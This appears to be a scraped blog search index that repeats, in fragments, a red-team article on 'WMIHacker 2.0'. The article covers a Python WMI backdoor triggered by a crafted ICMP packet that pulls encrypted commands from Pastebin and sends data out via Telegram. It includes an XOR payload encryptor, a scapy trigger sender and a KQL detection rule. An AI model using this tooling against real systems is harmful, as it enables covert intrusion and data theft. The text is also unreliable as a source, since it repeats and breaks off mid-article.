approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\npython wmihacker.py \u0026lt;\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric 